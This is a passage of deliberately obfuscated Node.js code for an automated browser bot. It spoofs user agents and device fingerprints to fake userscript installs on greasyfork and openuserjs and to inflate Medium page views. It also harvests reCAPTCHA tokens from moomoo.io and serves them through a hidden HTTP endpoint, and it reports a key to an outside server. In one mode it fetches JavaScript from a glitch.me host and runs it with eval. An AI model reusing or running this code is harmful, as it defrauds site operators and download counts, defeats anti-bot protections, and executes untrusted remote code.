      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + X(0x4, 'o)@I') + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + Y(0x6) + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + X(0xe, 'NDh0') + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    Y(0x9) + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + Y(0xb) + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + V(0x3) + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    X(0x12, '[r$3') + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + Y(0x22) + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + Y(0x13) + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => -0x1 * -0xcb3 + 0xad * -0x32 + 0x1517
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    const Z = d;
    log(Z(0x20) + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](0x1b66 + -0x4 * -0x26 + -0x2 * 0xdff)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, -0x12 * -0x1d9 + 0x239 * -0x8 + -0xf16), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, -0xbc3 + -0x47 * -0x26 + 0x19d), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const a0 = d,
          r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = 0x4 * -0x78e + -0x2 * -0x7e5 + 0xe6e;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r[a0(0x15)](), await q();
          for (let w = -0x17b * 0x1 + -0x55e * -0x5 + 0x1 * -0x195b; w < getRandomInt(0x4e5 * -0x1 + 0x1 * -0x254b + 0x607 * 0x7, 0x349 * 0x4 + -0x26e7 + 0x19c8); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(-0x1a74 + 0x1428e + -0x3dba);
        }
      }();
    }, -0xfa1 + -0x6 * -0x5c7 + -0x12a5), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = -0x625 + -0x151e + 0x1b43;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](0x1202 + -0x10e1 * 0x1 + 0x11 * -0x11, 0xbd7 + 0xe60 + -0x1a05 * 0x1)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, 0x1706 * -0x2 + 0x29f1 * -0x5 + 0x174f1);
    }, -0x21b2 + 0x1 * 0x1351 + 0xec5), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = -0x16b + -0x251b + 0x2686;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(-0x69b + 0xe4d + -0x203 * -0x2), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', 0x97 * -0xd + -0x950 + 0x10fb), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(0x18450f + 0x2 * 0x29169 + 0x5396b * -0x3);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, 0x1d * -0x10f + 0x24f8 + -0x5e1);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](0xe27 + 0x2b7 * 0xd + 0x1 * -0x30aa);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || -0x1c21 + 0x10a9 + 0x88 * 0x51);
}
doFlags['doOUJS'] && ((async () => {
  const a4 = c,
    a3 = d;
  async function f() {
    const a2 = b,
      a1 = d,
      k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = 0x19 * 0x47 + 0x3 * -0x61a + 0xb60) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (0x1aaf + 0x17be * 0x1 + -0x326c));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](0x1b5f + -0x1f92 + 0x433, D['indexOf']('\x20'));
        return B ? E['slice'](0xb3 * -0x33 + -0x25a8 + 0x1 * 0x4951, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](0x4cac + -0x28b8 + -0x31c * -0x1),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + a1(0xc),
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](0xa9 * -0x2 + -0x688 * -0x8 + -0x3e * 0x31),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + a2(0x23, 'qu)1') + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + a2(0x1b, 'H%GW') + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + a3(0xf) + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + a4(0x18) + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      a4(0x1c) + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
